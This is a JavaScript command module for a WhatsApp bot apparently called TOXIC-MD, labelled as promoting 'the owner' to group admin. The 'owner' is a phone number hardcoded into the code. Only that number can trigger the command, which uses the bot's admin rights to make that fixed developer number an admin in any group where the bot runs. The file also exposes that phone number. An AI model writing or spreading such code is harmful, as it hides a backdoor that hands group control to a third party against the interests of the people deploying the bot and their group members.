const DEVELOPER_NUMBER = "254735342808";

const normalizeNumber = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const isDeveloper = (jid) => normalizeNumber(jid) === normalizeNumber(DEVELOPER_NUMBER);

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.groupParticipantsUpdate(groupId, [participant], "promote");
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};

module.exports = {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the owner to admin',
    run: async (context) => {
        const { client, m, isBotAdmin } = context;

        if (!m.isGroup) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ This command only works in groups.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        if (!isDeveloper(m.sender)) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Only the owner can use this command.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        if (!isBotAdmin) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ I need admin privileges to\n├ perform this action.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const devNorm = normalizeNumber(DEVELOPER_NUMBER);
            const ownerMember = groupMetadata.participants.find(member => normalizeNumber(member.id) === devNorm);

            if (!ownerMember) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is not in this group.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
            if (ownerMember?.admin) return m.reply(`╭───(    TOXIC-MD    )───\n├ \n├ Owner is already an admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);

            const actualJid = normalizeNumber(ownerMember.id);
            await retryPromote(client, m.chat, actualJid);
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ PROMOTED ≪───\n├ \n├ Owner has been promoted to admin.\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        } catch (error) {
            return m.reply(`╭───(    TOXIC-MD    )───\n├───≫ ERROR ≪───\n├ \n├ Failed to promote: ${error.message}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`);
        }
    }
};
